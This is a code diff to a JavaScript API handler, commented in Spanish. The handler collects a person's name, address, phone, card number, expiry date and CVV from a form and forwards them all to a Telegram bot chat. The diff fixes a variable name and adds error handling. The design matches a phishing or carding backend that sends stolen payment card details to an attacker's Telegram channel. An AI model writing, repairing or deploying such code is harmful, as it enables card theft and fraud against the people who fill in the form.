@@ -1,6 +1,6 @@
 export default async function handler(req, res) {
   if (req.method === "POST") {
-
+    // Corregimos "fecha-expiracion" por "fechaExpiracion" o como venga del formulario
     const {
       nombre,
       apellido,
@@ -12,7 +12,7 @@ export default async function handler(req, res) {
       telefono,
       titular_tarjeta,
       numero_tarjeta,
-      fecha-expiracion,
+      fechaExpiracion, // Cambiado aquí
       cvv
     } = req.body;
 
@@ -35,22 +35,30 @@ ${direccion2 || ""}
 
 📝 Nombre del titular: ${titular_tarjeta}
 
-🔢 ${numero_tarjeta} | ${fecha-expiracion} | ${cvv}
+🔢 ${numero_tarjeta} | ${fechaExpiracion} | ${cvv} 
 `;
 
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: mensaje
-      })
-    });
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mensaje
+        })
+      });
 
-    return res.status(200).json({ ok: true });
+      if (response.ok) {
+        res.status(200).json({ success: true });
+      } else {
+        res.status(500).json({ error: "Error al enviar a Telegram" });
+      }
+    } catch (error) {
+      res.status(500).json({ error: "Error de red" });
+    }
+  } else {
+    res.status(405).json({ message: "Método no permitido" });
   }
-
-  return res.status(405).end();
 }
